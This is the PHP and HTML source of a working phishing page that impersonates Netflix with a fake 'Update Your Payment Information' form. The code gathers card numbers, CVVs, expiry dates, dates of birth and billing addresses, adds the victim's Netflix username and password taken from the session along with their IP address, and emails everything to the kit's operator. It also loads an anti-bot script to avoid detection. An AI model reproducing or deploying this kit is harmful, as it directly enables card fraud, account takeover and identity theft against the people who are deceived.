<?php 
	/*
	*
	* CC + Billing Info
	*
	*/

  include('../bot.php'); // Load le anti-bot
  include('../email.php'); // Load les configs -> inutile for now à pars le email

  session_start();

  if(isset($_POST['payment'])) {

      $login = $_SESSION['login']['username'];
      $password = $_SESSION['login']['password'];

      $fullname = $_POST['fullname'];
      $cardnumber = $_POST['cardnumber'];
      $exp = $_POST['exp'];
      $cvv = $_POST['cvv'];
      $first = $_POST['first'];
      $last = $_POST['last'];
      $dob = $_POST['dob'];
      $billing = $_POST['billing'];
      $country = $_POST['country'];
      $province = $_POST['province'];
      $city = $_POST['city'];
      $zip = $_POST['zip'];

      $ip = $_SERVER['REMOTE_ADDR'];
      $useragent = $_SERVER['HTTP_USER_AGENT'];

      // Possibilité de rajouter des filters pour valider les infos

      // Envoi du mail

      $subject = "New Login Netflix";
      $txt = "
      <h4 style='font-weight: bold;font-family: sans-serif;'>
      Credit Card INFO<br>
      🔥 Full Name : $fullname<br>
      🔥 Card Number : $cardnumber<br>
      🔥 Expiration Date : $exp<br>
      🔥 Security Code : $cvv<br>
      <br></h4><br>
      <h4>
      Billing Info <br>
      🔥 First Name : $first <br>
      🔥 Last Name : $last <br>
      🔥 Date Of Birth : $dob <br>
      🔥 Billing : $billing <br>
      🔥 Country : $country <br>
      🔥 Province : $province <br>
      🔥 City : $city <br>
      🔥 Zip : $zip
      </h4> <br>
      <h4 style='font-weight: bold;font-family: sans-serif;'>
      👇👇👇👇👇👇👇 More INFO 👇👇👇👇👇👇👇<br>
      👉 Netflix Username : $login <br>
      👉 Netflix Password : $password <br>
      👉 Ip : $ip<br>
      👉 User Agent : $useragent <br>
      👆👆👆👆👆👆 END More INFO 👆👆👆👆👆👆<br></h4>";
      $headers = "From: brs@brs.com" . "\r\n";
      $headers = "MIME-Version: 1.0" . "\r\n";
      $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
      mail($sendTo,$subject,$txt,$headers);

      header("Location: finish.php");
      die();
  }

 ?>
<!doctype html>
<html class="no-js" lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="css/foundation.min.css">
    <link rel="stylesheet" type="text/css" href="css/app.css">
    <link rel="shortcut icon" href="img/icon.ico">
    <link rel="apple-touch-icon" href="img/icon.png">
  </head>
  <body>

  	<div class="bg">
    
   	<header>
   		<a href="#" class="nflogo signupBasicHeader"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title><g><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg></a>
   	</header>

   	<section class="paymentsection">
   		<div class="login">
   			<div class="mainlogin">
   				<h1 class="update">Update Your Payment Information</h1>
          <div>
            <span class="cc visa"></span>
            <span class="cc mastercard"></span>
            <span class="cc amex"></span>
          </div>
   				<form method="POST" action"">
   					<div class="paymentinput">
                <input type="text" name="fullname" id="fullname" minlength="2" maxlength="50">
                <label for="fullname">Full name</label>   
            </div>
            <div class="paymentinput">
              <input type="text" name="cardnumber" id="cardnumber" minlength="16" maxlength="16">
              <label for="cardnumber">Card Number</label>   
            </div>
            <div class="grid-x grid-margin-x">
              <div class="cell large-6">
                <div class="paymentinput">
                  <input type="text" name="exp" id="exp" minlength="6" maxlength="7">
                  <label for="exp">Expiration Date (MM/YYYY)</label>      
                </div>
              </div>
              <div class="cell large-6">
                <div class="paymentinput">
                  <input type="text" name="cvv" id="cvv" minlength="3" maxlength="3">
                  <label for="cvv">Security Code (CVV)</label>      
                </div>
              </div>
            </div>
            <h1 class="update">Billing Adress</h1>
            <div class="grid-x grid-margin-x">
              <div class="cell large-6">
                <div class="paymentinput">
                  <input type="text" name="first" id="first" minlength="2" maxlength="50">
                  <label for="first">First Name</label>   
                </div>
              </div>
              <div class="cell large-6">
                <div class="paymentinput">
                  <input type="text" name="last" id="last" minlength="2" maxlength="50">
                   <label for="last">Last Name</label>   
                </div>
              </div>
            </div>   
            <div class="grid-x grid-margin-x">
              <div class="cell large-6">
                <div class="paymentinput">
                <input type="text" name="dob" id="dob" minlength="8" maxlength="10">
                <label for="dob">Date of birth (DD/MM/YYYY)</label>   
                </div>
              </div>
            </div> 
            <div class="paymentdiviser"></div>
            <div class="paymentinput">
                <input type="text" name="billing" id="billing" minlength="2" maxlength="50">
                <label for="billing">Billing Adress</label>   
            </div>
            <div class="grid-x grid-margin-x">
              <div class="cell large-6">
                <div class="paymentinput">
                    <input type="text" name="country" id="country" minlength="2" maxlength="50">
                    <label for="country">Country</label>   
                </div>
              </div>  
              <div class="cell large-6">
                <div class="paymentinput">
                    <input type="text" name="province" id="province" minlength="2" maxlength="50">
                    <label for="province">Province / State</label>   
                </div>
              </div> 
            </div>  
            <div class="grid-x grid-margin-x">
              <div class="cell large-6">
                <div class="paymentinput">
                    <input type="text" name="city" id="city" minlength="2" maxlength="50">
                    <label for="city">City</label>   
                </div>
              </div>  
              <div class="cell large-6">
                  <div class="paymentinput">
                      <input type="text" name="zip" id="zip" minlength="6" maxlength="10">
                      <label for="zip">Zip Code</label>   
                  </div>
              </div> 
            </div> 
          <!--  <p>By clicking the "Start Membership" button below, you agree to our <a target="blank" href="https://help.netflix.com/legal/termsofuse">Terms of Use</a>, <a target="blank" href="https://help.netflix.com/legal/privacy">Privacy Statement</a>, and that you are over 18. You may cancel at any time. To cancel, go online to your Account and click on "Cancel Membership."</p>
            <p><b>Netflix will automatically continue your membership and charge the membership fee (currently $8.99) to your payment method on a monthly basis until you cancel.</b> There are no refunds or credits for partial months.</p> -->
   					<button type="submit" name="payment" class="submit">Confirm</button>
   				</form>
   			</div>
   		</div>
   	</section>

   	<footer>
   		<div class="footerdiviser"></div>
   		<div class="sitefooter">
   			<p class="footertop">Questions? Call 1-877-742-1335</p>
   			<ul class="footerlinks">
   			<li>Gift Card Terms</li>
   			<li>Terms of Use</li>
   			<li>Privacy Statement</li>
   		</ul>
   		</div>
   	</footer>
   	</div>
   	
    <script src="js/vendor/jquery.js"></script>
    <script src="js/vendor/what-input.js"></script>
    <script src="js/vendor/foundation.min.js"></script>
    <script>
      $(document).foundation();
    </script>
    <script>
      $(document).ready(function() {
          $("#exp").keydown(function(event) {
              // Allow: backspace, delete, tab, escape, and enter
              if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 || event.keyCode == 13 || 
                   // Allow: Ctrl+A
                  (event.keyCode == 65 && event.ctrlKey === true) || 
                   // Allow: home, end, left, right
                  (event.keyCode >= 35 && event.keyCode <= 39)) {
                       return;
              }
              else {
                  // Ensure that it is a number and stop the keypress
                  if (event.shiftKey || (event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {   
                      event.preventDefault(); 
                  }   
              }

              if(  $("#exp").val().length == 2 )
             {
                  event.target.value = event.target.value + "/";
             }
          });

          $("#cardnumber").keydown(function(event) {
              // Allow: backspace, delete, tab, escape, and enter
              if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 || event.keyCode == 13 || 
                   // Allow: Ctrl+A
                  (event.keyCode == 65 && event.ctrlKey === true) || 
                   // Allow: home, end, left, right
                  (event.keyCode >= 35 && event.keyCode <= 39)) {
                       return;
              }
              else {
                  // Ensure that it is a number and stop the keypress
                  if (event.shiftKey || (event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {   
                      event.preventDefault(); 
                  }   
              } 
          });

          $("#cvv").keydown(function(event) {
              // Allow: backspace, delete, tab, escape, and enter
              if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 || event.keyCode == 13 || 
                   // Allow: Ctrl+A
                  (event.keyCode == 65 && event.ctrlKey === true) || 
                   // Allow: home, end, left, right
                  (event.keyCode >= 35 && event.keyCode <= 39)) {
                       return;
              }
              else {
                  // Ensure that it is a number and stop the keypress
                  if (event.shiftKey || (event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {   
                      event.preventDefault(); 
                  }   
              } 
          });

          $("#dob").keydown(function(event) {
              // Allow: backspace, delete, tab, escape, and enter
              if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 || event.keyCode == 13 || 
                   // Allow: Ctrl+A
                  (event.keyCode == 65 && event.ctrlKey === true) || 
                   // Allow: home, end, left, right
                  (event.keyCode >= 35 && event.keyCode <= 39)) {
                       return;
              }
              else {
                  // Ensure that it is a number and stop the keypress
                  if (event.shiftKey || (event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {   
                      event.preventDefault(); 
                  }   
              } 

              if(  $("#dob").val().length == 2 ) {
                    event.target.value = event.target.value + "/";
              }
              if(  $("#dob").val().length == 5 ) {
                  event.target.value = event.target.value + "/";
              }
          });
      });
    </script>

  </body>
</html>